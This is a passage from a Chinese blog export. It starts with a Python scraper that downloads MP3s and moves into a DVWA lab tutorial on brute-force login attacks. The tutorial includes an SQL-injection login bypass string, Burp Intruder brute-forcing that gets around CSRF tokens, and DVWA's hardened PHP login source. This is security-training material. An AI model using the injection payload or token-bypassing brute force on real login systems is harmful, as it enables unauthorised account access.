下午8.12.26"></p><p>下载成功。</p><p>查看目录页面源码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.33.19.png" alt="截屏2022-03-30 下午8.33.19"></p><p>链接在val参数里。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.44.10.png" alt="截屏2022-03-30 下午8.44.10"></p><p>都在同一个的class里。</p><p>尝试爬取val参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>url = <span class="hljs-string">&#x27;https://mp.zhizhuma.com/book.htm?id=111541&amp;sign=ca9627#22118679&#x27;</span><br>soup = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---&#x27;</span>)<br><span class="hljs-built_in">print</span>(li[<span class="hljs-string">&#x27;val&#x27;</span>])<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%889.01.36.png" alt="截屏2022-03-30 下午9.01.36" style="zoom:33%;" /><p>由于链接不全，再循环拼接一下域名，拼接后存放进列表link。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">link=[]<br>soup_url = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup_url.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br>  link = <span class="hljs-string">&#x27;https://mp.zhizhuma.com&#x27;</span>+li[<span class="hljs-string">&#x27;val&#x27;</span>]<br>  url_list.append(link)<br><br></code></pre></td></tr></table></figure><p>接下来将代码进行整理拼接。</p><h2 id="3-代码"><a href="#3-代码" class="headerlink" title="3.代码"></a>3.代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url</span>(<span class="hljs-params">url</span>):  <span class="hljs-comment">#获取mp3链接所在页面的链接，并存入列表url_list</span><br>soup_url = BeautifulSoup(urlopen(url),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>li_all = soup_url.find_all(<span class="hljs-string">&#x27;div&#x27;</span>,attrs=&#123;<span class="hljs-string">&#x27;class&#x27;</span>:<span class="hljs-string">&#x27;section-wrapper&#x27;</span>&#125;)<br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_all:<br>link = <span class="hljs-string">&#x27;https://mp.zhizhuma.com&#x27;</span>+li[<span class="hljs-string">&#x27;val&#x27;</span>]<br>url_list.append(link)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mp3url</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<span class="hljs-comment">#获取mp3链接</span><br>soup_mp3 = BeautifulSoup(urlopen(<span class="hljs-built_in">str</span>),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup_mp3.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br><span class="hljs-keyword">global</span> mp3<br><span class="hljs-keyword">for</span> mp3_li <span class="hljs-keyword">in</span> mp3_all:<br>mp3 = mp3_li[<span class="hljs-string">&#x27;src&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_mp3</span>(<span class="hljs-params">mp3_url</span>): <span class="hljs-comment">#下载mp3文件，并保存在当前文件夹</span><br><span class="hljs-keyword">try</span>:<br>pathname=<span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&#x27;.mp3&#x27;</span> <br>urllib.request.urlretrieve(mp3_url,pathname)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载成功&quot;</span>,pathname)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下载失败。&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>url_list=[]<br>num=<span class="hljs-number">0</span> <span class="hljs-comment">#计数用</span><br>url = <span class="hljs-string">&#x27;https://mp.zhizhuma.com/book.htm?id=111541&amp;sign=ca9627#22118679&#x27;</span><br>get_url(url) <span class="hljs-comment">#获取mp3所在页面的所有链接</span><br><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>get_mp3url(url)<br>num+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;获得链接&#x27;</span>,num,<span class="hljs-string">&#x27;为&#x27;</span>,mp3)<br>download_mp3(mp3)<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.57.20.png" alt="截屏2022-03-30 下午10.57.20" style="zoom:33%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8811.00.09.png" alt="截屏2022-03-30 下午11.00.09" style="zoom: 33%;" /><p>下载成功！</p><h2 id="4-出现的问题及解决方案"><a href="#4-出现的问题及解决方案" class="headerlink" title="4.出现的问题及解决方案"></a>4.出现的问题及解决方案</h2><p><strong>报错出现TypeError: ‘NoneType’ object is not subscriptable：</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.14.13.png" alt="截屏2022-03-30 下午10.14.13"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mp3url</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>soup_mp3 = BeautifulSoup(urlopen(<span class="hljs-built_in">str</span>),<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>mp3_all = soup_mp3.find_all(<span class="hljs-string">&#x27;audio&#x27;</span>)<br>mp3 = soup_mp3.audio[<span class="hljs-string">&#x27;src&#x27;</span>]<br>mp3_list.append(mp3)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>发现是mp3 &#x3D; soup_mp3.audio[‘src’]这一句会报错。</p><p>改成循环读取就不会了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> mp3_i <span class="hljs-keyword">in</span> mp3_all:<br>mp3 = mp3_i[<span class="hljs-string">&#x27;src&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.18.03.png" alt="截屏2022-03-30 下午10.18.03"></p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA全部分学习</title>
    <link href="/2021/07/06/old/dvwa2/"/>
    <url>/2021/07/06/old/dvwa2/</url>
    
    <content type="html"><![CDATA[<h1 id="一、docker搭建dvwa"><a href="#一、docker搭建dvwa" class="headerlink" title="一、docker搭建dvwa"></a>一、docker搭建dvwa</h1><h2 id="1-搜索dvwa"><a href="#1-搜索dvwa" class="headerlink" title="1.搜索dvwa"></a>1.搜索dvwa</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search dvwa</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104508081.png" alt="image-20210628104508081"></p><span id="more"></span><h2 id="2-拉取选中的镜像"><a href="#2-拉取选中的镜像" class="headerlink" title="2.拉取选中的镜像"></a>2.拉取选中的镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull citizenstig/dvwa<br></code></pre></td></tr></table></figure><h2 id="3-查看镜像是否拉取成功"><a href="#3-查看镜像是否拉取成功" class="headerlink" title="3.查看镜像是否拉取成功"></a>3.查看镜像是否拉取成功</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure><h2 id="4-运行"><a href="#4-运行" class="headerlink" title="4.运行"></a>4.运行</h2><p>临时：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it -p 80:80 citizenstig/dvwa</span><br></code></pre></td></tr></table></figure><p>创建容器：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> citizenstig/dvwa<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104846227.png" alt="image-20210628104846227"></p><p>默认账号密码：admin&#x2F;password</p><h1 id="二、brute-force（爆破）"><a href="#二、brute-force（爆破）" class="headerlink" title="二、brute force（爆破）"></a>二、brute force（爆破）</h1><p>界面：</p><p>![image-20210628114113729](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210628114113729.png)</p><h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628110149915.png" alt="image-20210628110149915"></p><p>传入账号和密码，使用sql语句进行查询，并没有进行过滤和验证。</p><p>使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1-- -</code>可以登陆。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111035077.png" alt="image-20210628111035077"></p><p>但属于bruteforce区，所以使用bp爆破。</p><p>使用bp抓包。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111131573.png" alt="image-20210628111131573"></p><p>右键sent to intruder，在知道账号为admin的情况下，选择attack type为sniper模式。</p><p>clear清理标记，add选择爆破点。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111321375.png" alt="image-20210628111321375"></p><p>载入payloads</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113608984.png" alt="image-20210628113608984"></p><p>attack！</p><p>排列长度，password和其他payload长度不同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628112008352.png" alt="image-20210628112008352"></p><p>查看回包，显示登录成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113846234.png" alt="image-20210628113846234"></p><h2 id="2-medium"><a href="#2-medium" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p>![image-20210628114354022](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210628114354022.png)</p><p>源码显示，login failed需要sleep（2）。也就意味着，每一次密码输入错误都会暂停两秒钟，大大增加了爆破的时间。</p><p>爆破试验一下，显然速度变慢了，但并不能阻止爆破。<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628140838768.png" alt="image-20210628140838768"></p><p>但密码仍然可以爆破出来。</p><p>输入的用户名和密码使用了mysql_real_escape_string() 函数进行了过滤，sql注入被防御。</p><blockquote><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p></blockquote><h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628153013911.png" alt="image-20210628153013911"></p><p>依然使用了mysql_real_escape_string()函数，还使用 stripslashes() 函数删除反斜杠无法进行sql注入。</p><p>比起medium，第一行多了一个checktoken（令牌检查）。</p><blockquote><p>什么是token？</p><p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p><p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p></blockquote><p>token用于防止重复提交。</p><p>抓包发现此时的get值多了一个<strong>user_token</strong>。</p><p>尝试多次提交后，返回信息变成了302。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154629783.png" alt="image-20210628154629783"></p><p>显示<strong>csrf token is incorrect</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154752412.png" alt="image-20210628154752412"></p><p>sent to intruder，attack type选择<strong>pitchfork</strong>。</p><blockquote><p>关于attack的四种模式</p><p><strong>1.Sniper</strong></p><p>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><p><strong>2.Battering ram</strong>  </p><p>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p><p><strong>3.pitchfork</strong></p><p> 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p><p><strong>4.Cluster bomb</strong></p><p> 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p></blockquote><p>Payload1选择和之前的一样，<strong>simple list</strong>，导入密码字典。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628162413546.png" alt="image-20210628162413546"></p><p>第二个payload需要先选择<strong>option</strong>，找到<strong>grep-extract</strong>，选择add。</p><p>点击<strong>fetch response</strong>，找到user_token的value位置，选中。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628163432187.png" alt="image-20210628163432187"></p><p>payload2的payload type设置为<strong>recursive grep</strong>（递归查找文件里符合条件的字符串）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628164448476.png" alt="image-20210628164448476"></p><p>option下线程要设置成1，该模式下无法多线程。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628170043112.png" alt="image-20210628170043112"></p><p>设置redirctions（重定向）为always。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165536718.png" alt="image-20210628165536718"></p><p>爆破！</p><p>回显成功！</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165704513.png" alt="image-20210628165704513"></p><h2 id="4-impossible"><a href="#4-impossible" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$user</span> );<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Default values</span><br>    <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br>    <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br>    <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Check the database (Check user information)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// Check to see if the user has been locked out.</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>        <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>        <span class="hljs-comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>        <span class="hljs-comment">// Calculate when the user would be allowed to login again</span><br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-variable">$last_login</span> );<br>        <span class="hljs-variable">$timeout</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$last_login&#125;</span> +<span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );<br>        <span class="hljs-variable">$timenow</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;now&quot;</span> );<br><br>        <span class="hljs-comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &gt; <span class="hljs-variable">$timeout</span> )<br>            <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check the database (if username matches the password)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span>);<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// If its a valid login...</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>        <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Had the account been locked out since last login?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Reset bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>        <span class="hljs-comment">// Give the user some feedback</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> 